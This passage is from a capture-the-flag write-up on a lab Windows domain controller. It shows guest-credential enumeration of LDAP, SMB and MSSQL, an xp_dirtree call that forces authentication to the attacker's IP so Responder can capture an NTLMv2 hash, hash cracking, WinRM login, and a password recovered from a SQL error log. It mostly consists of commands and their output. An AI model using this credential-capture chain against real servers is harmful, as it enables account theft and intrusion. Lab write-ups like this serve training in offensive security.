+</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\P</span>ublicUser:GuestUserCantWrite1<span class="w"> </span><span class="o">(</span>Login<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;sequel\Guest&#39;</span>.<span class="w"> </span>Please<span class="w"> </span>try<span class="w"> </span>again<span class="w"> </span>with<span class="w"> </span>or<span class="w"> </span>without<span class="w"> </span><span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span>
+</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>MSSQL<span class="w"> </span>with<span class="w"> </span><span class="nb">local</span><span class="w"> </span>SQL<span class="w"> </span>auth...
+</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>DC<span class="se">\P</span>ublicUser:GuestUserCantWrite1
+</span></code></pre></div>
+<p>According to the output here, we can login towards <code>LDAP</code>,<code>SMB</code> and <code>MSSQL</code> services, lets enumerate them with those creds:</p>
+<h2 id="ldap-enumeration-as-publicuser">LDAP enumeration as PublicUser</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://sequel.htb<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts<span class="w"> </span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>dn:
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>sequel,DC<span class="o">=</span>htb
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>sequel,DC<span class="o">=</span>htb
+</span></code></pre></div>
+<p>tried anonymous , not successful:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://sequel.htb<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=sequel,DC=htb&quot;</span>
+</span></code></pre></div>
+<h2 id="smb-enumeration-as-publicuser">SMB enumeration as PublicUser</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>sequel.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;PublicUser&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;GuestUserCantWrite1 &#39;</span><span class="w"> </span>--shares
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>sequel.htb<span class="w"> </span>-d<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>PublicUser-p<span class="w"> </span>GuestUserCantWrite1
+</span></code></pre></div>
+<p>All of these failed…. hm what now, we tried <code>LDAP</code> <code>SMB</code> and no luck.</p>
+<p>Lets move on and to investigate <code>MSSQL</code> :</p>
+<h2 id="mssql-enumeration-as-publicuser">MSSQL enumeration as PublicUser</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>mssqlclient.py<span class="w"> </span>sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+</span></code></pre></div>
+<p>login was successful! , lets move on now and try to inspect the databases inside:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>name<span class="w"> </span>from<span class="w"> </span>master..sysdatabases<span class="p">;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>name<span class="w">     </span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>------<span class="w">   </span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>master<span class="w">   </span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>tempdb<span class="w">   </span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>model<span class="w">    </span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>msdb<span class="w">  </span>
+</span></code></pre></div>
+<p>After some research, i found that these 4 databases are default databases on MSSQL…. so navigating their schemas and values wont provide anything usefull.</p>
+<hr />
+<h1 id="foothold">Foothold</h1>
+<p>But what to do next??? Can we do sth more in MSSQL besides viewing database contents?</p>
+<p>i did some research, tried multiple things from here:<br />
+<a href="https://hacktricks.xsx.tw/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://hacktricks.xsx.tw/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a></p>
+<p>but the only one that appeared to work was the <code>NetNTLM</code> part:</p>
+<p>remotely, on the MSSQL shell run this with your attacker ip:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>EXEC<span class="w"> </span>xp_dirtree<span class="w"> </span><span class="s1">&#39;\\10.10.14.96\share&#39;</span>,<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div>
+<p>and on your host, start responder:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>Responder.py<span class="w"> </span>-I<span class="w"> </span>tun0
+</span></code></pre></div>
+<p>aand we got the ntlm hash of <code>sql_svc</code> user!</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span><span class="k">for</span><span class="w"> </span>events...
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.129.228.253
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>sequel<span class="se">\s</span>ql_svc
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>sql_svc::sequel:031325f9a83e80fb:D6EE0D2E3D143D7A98B504141951CB4B:01010000000000008074FBAFBD0FDC01FAB7D3718260D4BE0000000002000800470043004B00550001001E00570049004E002D004F00500045003900370052003800420044004E00350004003400570049004E002D004F00500045003900370052003800420044004E0035002E00470043004B0055002E004C004F00430041004C0003001400470043004B0055002E004C004F00430041004C0005001400470043004B0055002E004C004F00430041004C00070008008074FBAFBD0FDC0106000400020000000800300030000000000000000000000000300000DB431A3C79C771BEAD50BC0D8459CAFF43AA7C9AE900254574DC2382A288D8060A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390036000000000000000000
+</span></code></pre></div>
+<p>Now that we have the hash, lets attempt to crack it:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>hashcat<span class="w"> </span>sql_svc_netntmlv2<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p>the crack was successful, and the password is <code>REGGIE1234ronnie</code>, we can now try to login via win-rm:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span>REGGIE1234ronnie
+</span></code></pre></div>
+<p>and we are in:</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image3.png" /></p>
+<p>whats next? i checked the desktop and there was no flag there. </p>
+<h2 id="directories-and-files-enumeration-as-sql_svc">Directories and Files enumeration as sql_svc</h2>
+<p>We could do some enumeration here, such as inspecting the Users:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>d-----<span class="w">         </span><span class="m">2</span>/7/2023<span class="w">   </span><span class="m">8</span>:58<span class="w"> </span>AM<span class="w">                </span>Administrator
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>d-r---<span class="w">        </span><span class="m">7</span>/20/2021<span class="w">  </span><span class="m">12</span>:23<span class="w"> </span>PM<span class="w">                </span>Public
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>d-----<span class="w">         </span><span class="m">2</span>/1/2023<span class="w">   </span><span class="m">6</span>:37<span class="w"> </span>PM<span class="w">                </span>Ryan.Cooper
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>d-----<span class="w">         </span><span class="m">2</span>/7/2023<span class="w">   </span><span class="m">8</span>:10<span class="w"> </span>AM<span class="w">                </span>sql_svc
+</span></code></pre></div>
+<p>tried navigating to <code>Public</code> and <code>Ryan.Cooper</code> but access was denied, lets move backwards towards the C drive to get a better picture of the overall file structure:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Directory:<span class="w"> </span>C:<span class="se">\</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>d-----<span class="w">         </span><span class="m">2</span>/1/2023<span class="w">   </span><span class="m">8</span>:15<span class="w"> </span>PM<span class="w">                </span>PerfLogs
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>d-r---<span class="w">         </span><span class="m">2</span>/6/2023<span class="w">  </span><span class="m">12</span>:08<span class="w"> </span>PM<span class="w">                </span>Program<span class="w"> </span>Files
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>d-----<span class="w">       </span><span class="m">11</span>/19/2022<span class="w">   </span><span class="m">3</span>:51<span class="w"> </span>AM<span class="w">                </span>Program<span class="w"> </span>Files<span class="w"> </span><span class="o">(</span>x86<span class="o">)</span>
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>d-----<span class="w">       </span><span class="m">11</span>/19/2022<span class="w">   </span><span class="m">3</span>:51<span class="w"> </span>AM<span class="w">                </span>Public
+</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>d-----<span class="w">         </span><span class="m">2</span>/1/2023<span class="w">   </span><span class="m">1</span>:02<span class="w"> </span>PM<span class="w">                </span>SQLServer
+</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>d-r---<span class="w">         </span><span class="m">2</span>/1/2023<span class="w">   </span><span class="m">1</span>:55<span class="w"> </span>PM<span class="w">                </span>Users
+</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>d-----<span class="w">         </span><span class="m">2</span>/6/2023<span class="w">   </span><span class="m">7</span>:21<span class="w"> </span>AM<span class="w">                </span>Window
+</span></code></pre></div>
+<p>Here are goal is to search for non default folders first. In this case, <code>Public</code> and <code>SQLServer</code> to me does not seem like default windows folders, so lets search those 2 first:</p>
+<p><code>Public</code> folder:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Directory:<span class="w"> </span>C:<span class="se">\P</span>ublic
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>-a----<span class="w">       </span><span class="m">11</span>/18/2022<span class="w">   </span><span class="m">5</span>:39<span class="w"> </span>AM<span class="w">          </span><span class="m">49551</span><span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf
+</span></code></pre></div>
+<p>Contains the pdf we found via smb earlier on the recon stage</p>
+<p><code>SQLServer</code> folder:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>Directory:<span class="w"> </span>C:<span class="se">\S</span>QLServer
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>d-----<span class="w">         </span><span class="m">2</span>/7/2023<span class="w">   </span><span class="m">8</span>:06<span class="w"> </span>AM<span class="w">                </span>Logs
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>d-----<span class="w">       </span><span class="m">11</span>/18/2022<span class="w">   </span><span class="m">1</span>:37<span class="w"> </span>PM<span class="w">                </span>SQLEXPR_2019
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>-a----<span class="w">       </span><span class="m">11</span>/18/2022<span class="w">   </span><span class="m">1</span>:35<span class="w"> </span>PM<span class="w">        </span><span class="m">6379936</span><span class="w"> </span>sqlexpress.exe
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>-a----<span class="w">       </span><span class="m">11</span>/18/2022<span class="w">   </span><span class="m">1</span>:36<span class="w"> </span>PM<span class="w">      </span><span class="m">268090448</span><span class="w"> </span>SQLEXPR_x64_ENU.exe
+</span></code></pre></div>
+<p>hm ok now we found some files, since inspecting/debugging the <code>.exe</code> files is a more difficult approach, i will try searching the <code>Logs</code> and <code>SQLEXPR_2019</code> folders first:</p>
+<p><code>Logs</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Directory:<span class="w"> </span>C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>-a----<span class="w">         </span><span class="m">2</span>/7/2023<span class="w">   </span><span class="m">8</span>:06<span class="w"> </span>AM<span class="w">          </span><span class="m">27608</span><span class="w"> </span>ERRORLOG.BAK
+</span></code></pre></div>
+<p>contains an <code>.BAK</code> file, which is an extension used to signify a backup copy of a file, also lets download it and inspect it offline:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt;<span class="w"> </span>download<span class="w"> </span>ERRORLOG.BAK
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>Info:<span class="w"> </span>Downloading<span class="w"> </span>C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs<span class="se">\E</span>RRORLOG.BAK<span class="w"> </span>to<span class="w"> </span>ERRORLOG.BAK
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>Info:<span class="w"> </span>Download<span class="w"> </span>successful!
+</span></code></pre></div>
+<p><code>ERRORLOG.BAK</code>:</p>
+<p>It contains large number of logs, but the most interesting ones were:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>..........
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="m">2022</span>-11-18<span class="w"> </span><span class="m">13</span>:43:07.44<span class="w"> </span>Logon<span class="w">       </span>Logon<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;sequel.htb\Ryan.Cooper&#39;</span>.<span class="w"> </span>Reason:<span class="w"> </span>Password<span class="w"> </span>did<span class="w"> </span>not<span class="w"> </span>match<span class="w"> </span>that<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>login<span class="w"> </span>provided.<span class="w"> </span><span class="o">[</span>CLIENT:<span class="w"> </span><span class="m">127</span>.0.0.1<span class="o">]</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="m">2022</span>-11-18<span class="w"> </span><span class="m">13</span>:43:07.48<span class="w"> </span>Logon<span class="w">       </span>Error:<span class="w"> </span><span class="m">18456</span>,<span class="w"> </span>Severity:<span class="w"> </span><span class="m">14</span>,<span class="w"> </span>State:<span class="w"> </span><span class="m">8</span>.
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="m">2022</span>-11-18<span class="w"> </span><span class="m">13</span>:43:07.48<span class="w"> </span>Logon<span class="w">       </span>Logon<span class="w"> </span>failed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span>.<span class="w"> </span>Reason:<span class="w"> </span>Password<span class="w"> </span>did<span class="w"> </span>not<span class="w"> </span>match<span class="w"> </span>that<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>login<span class="w"> </span>provided.<span class="w"> </span><span class="o">[</span>CLIENT:<span class="w"> </span><span class="m">127</span>.0.0.1<span class="o">]</span>
+</span></code></pre></div>
+<p>As we can see here, it contains SQL error log, the logs above show that user <code>Ryan.Cooper</code> failed to login once. After ryan’s failed login, another user seems to fail <code>NuclearMosquito3</code> but by inspecting earlier the valid user i did not see that user anywhere! What if this username was a mistype by ryan and provided his password instead of his username? Lets find out:</p>
+<h2 id="checking-where-we-can-login-with-ryans-creds">Checking where we can login with ryan’s creds</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>sequel.htb<span class="w"> </span><span class="s1">&#39;Ryan.Cooper&#39;</span><span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3<span class="w"> </span>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>
